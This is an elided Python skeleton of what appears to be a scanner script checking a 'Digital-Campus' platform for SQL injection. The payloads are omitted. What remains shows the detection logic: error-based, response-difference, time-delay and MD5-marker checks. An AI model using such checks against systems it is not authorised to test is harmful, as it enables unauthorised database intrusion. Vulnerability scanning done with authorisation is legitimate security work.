...
class digital_campus_systemcodelist_sqli:
    ...
    def run(self):
        ...
        for payload in payloads:
            ...
            try:
                ...
                printRed("[-] "+self.__class__.__name__+" ==>连接超时")
                sys.exit(1)

        if r"DayNum" in reqlst[0] and r"DayNum" in reqlst[1]:
            if len(reqlst[0]) != len(reqlst[1]):
                printGreen("[+]Success:存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在digital_campus_systemcodelist_sqli漏洞-Payload 1")
        ...
        try:
            ...
            if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                ...
                printBlue("[-]Info:不存在digital_campus_systemcodelist_sqli漏洞-Payload 2")
        ...
        try:
            ...
            if time.time() - start_time >= 6:
                ...
                printBlue("[-]Info:不存在digital_campus_systemcodelist_sqli漏洞-Payload 3")
        ...
        try:
            ...
            if time.time() - start_time >= 6:
                ...
                printBlue("[-]Info:不存在digital_campus_systemcodelist_sqli漏洞-Payload 4")
        ...
        try:
            ...
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                ...
                printBlue("[-]Info:不存在digital_campus_systemcodelist_sqli漏洞-Payload 5")
        ...
        try:
            ...
            if time.time() - start_time >= 6:
                ...
                printBlue("[-]Info:不存在digital_campus_systemcodelist_sqli漏洞-Payload 6")
...
if __name__ == "__main__":
    ...
    testVuln = digital_campus_systemcodelist_sqli(sys.argv[1])
    testVuln.run()